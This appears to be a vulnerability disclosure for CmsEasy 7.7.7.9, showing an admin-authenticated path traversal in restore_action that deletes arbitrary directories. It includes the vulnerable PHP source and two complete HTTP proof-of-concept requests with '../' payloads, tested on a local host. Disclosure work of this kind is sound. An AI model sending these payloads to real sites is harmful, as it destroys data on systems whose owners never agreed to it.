# CmsEasy has a path traversal vulnerability.



**Note: This vulnerability requires backend access.**



# Vendor Information



**Developer:** 四平市九州易通科技有限公司 ( Siping Jiuzhou Yitong Technology Co., Ltd. )

**Product Information:** CmsEasy V7.7.7.9 (20240105)

**Official Website:** https://www.cmseasy.cn/

**Product Source Code Download:** https://ftp.cmseasy.cn/CmsEasy7.x/CmsEasy_7.7.7_UTF-8_20240105.zip



# Introduce



**Note: This reproduction requires logging into the admin panel first.**

CmsEasy has a directory traversal vulnerability in `lib/admin/database_admin.php` (function: `restore_action`) that allows arbitrary path deletion. Attackers can exploit this vulnerability to traverse directories and delete arbitrary path.



# Trigger Point

**Note: This vulnerability requires backend access.**

The vulnerability is located in the `lib/admin/database_admin.php` file, specifically in the `restore_action` function.

**Note:** In the project, `front::post` is equivalent to `$_POST`.

**Objective:** Pass a crafted `payload` to execute `front::remove($dir.'/'.$d);`.

```php
function restore_action() {
        chkpw('func_data_restore');
        $dir=ROOT.'/data/backup-data/';
        if(front::post('submit') &&is_array(front::post('select'))) {
            foreach(front::post('select') as $d) {
                front::remove($dir.'/'.$d);   // -------------执行点--------
            }
            front::flash(lang_admin('success').lang_admin('delete').count(front::post('select')).lang_admin('individual').lang_admin('archives').'！');
        }
        $dirs=front::scan($dir);
        $db_dirs=array();
        foreach($dirs as $dir) {
            if(!preg_match('/\./',$dir) &&!preg_match('/hotsearch/',$dir)) $db_dirs[]=$dir;
        }
        $this->view->db_dirs=$db_dirs;
    }
```



# Vulnerability Analysis

**Note: This vulnerability requires backend access.**

It can be observed that the `restore_action` function directly concatenates inputs without any filtering, allowing for directory traversal.

Next, let's examine the implementation of the `remove` function.

```php
static function remove($dirname)
    {
        if (is_dir($dirname)) {
            $dir = new RecursiveDirectoryIterator($dirname);
            foreach ($dir as $k => $v) {
                if (!$dir->isDot()) {
                    if ($v->isDir()) {
                        self::remove($v->getPathname());
                    } else {
                        unlink($v->getPathname());
                    }
                }
            }
            unset($dir);
            rmdir($dirname);
            return true;
        }
        return false;
    }
```

**Function: Recursively deletes the specified directory and all its contents (including subdirectories and files).**



## Request Construction



Due to partial source code obfuscation, testing has revealed the following:

**Request Analysis:**

```http
http://127.0.0.1:5678/index.php?case=database&act=backAll&admin_dir=admin&site=default
```

The `case` parameter corresponds to the business logic file located in the `lib/admin` directory (`xxxx_admin.php`). (In this example, it is `database_admin.php`.)

The `act` parameter corresponds to the `xxxx_action` function within the file specified by `case`. (In this example, it is the `backAll_action()` method.)

The `admin_dir` parameter points to the backend directory. (This vulnerability requires backend access.)

The `site` parameter is the default parameter when not explicitly configured.



Therefore, based on this, we construct the request: `{xxxx}` in the POST data represents the trigger point.

The following request targets the `restore_action` function in `database_admin.php`.

```http
http://127.0.0.1:5678/index.php?case=database&act=restore&admin_dir=admin&site=default

POST:
submit=1&select[]={xxxx}
```



## **POC Construction and Verification**



Create a directory `11` at the same level as `data/backup-data` (which may include subdirectories) as an example to avoid directly damaging the website environment.

![image-20250129225807278](/assest/cmseasy/vul-3/cmseasy-3.1.png)

**Constructing the Payload**

```http
POST /index.php?case=database&act=restore&admin_dir=admin&site=default HTTP/1.1
Host: 192.168.216.1:5678
Content-Length: 29
Cache-Control: max-age=0
Origin: http://192.168.216.1:5678
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.216.1:5678/index.php?case=admin&act=login&admin_dir=admin&site=default
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=l3roi1git2t3i2ma7p6jv86ie6; loginfalse=0; login_username=admin; login_password=aYUHEbyItYBTBUSfIYvkyMB79nyjAlRP%253DUPk1YvRdYx%253DL2ab18391e6e61e99aff8e10d05e4ad02
Connection: keep-alive

submit=1&select[]=../11
```



**The response template not existing is a normal behavior (this is expected).**

![image-20250129225913985](/assest/cmseasy/vul-3/cmseasy-3.2.png)



**Check the `11` directory and confirm that it has been successfully deleted.**

![image-20250129225947966](/assest/cmseasy/vul-3/cmseasy-3.3.png)

**Continue the verification by creating a subdirectory `11` under the website root directory as an example (it may include substructures) to test recursive deletion.**

![image-20250129230020319](/assest/cmseasy/vul-3/cmseasy-3.4.png)

**Constructing the Payload**

```http
POST /index.php?case=database&act=restore&admin_dir=admin&site=default HTTP/1.1
Host: 192.168.216.1:5678
Content-Length: 26
Cache-Control: max-age=0
Origin: http://192.168.216.1:5678
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.216.1:5678/index.php?case=admin&act=login&admin_dir=admin&site=default
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=l3roi1git2t3i2ma7p6jv86ie6; loginfalse=0; login_username=admin; login_password=aYUHEbyItYBTBUSfIYvkyMB79nyjAlRP%253DUPk1YvRdYx%253DL2ab18391e6e61e99aff8e10d05e4ad02
Connection: keep-alive

submit=1&select[]=../../11
```

**Check and confirm that the `11` directory has been successfully deleted.**

![image-20250129230122043](/assest/cmseasy/vul-3/cmseasy-3.5.png)

**Vulnerability successfully verified.**

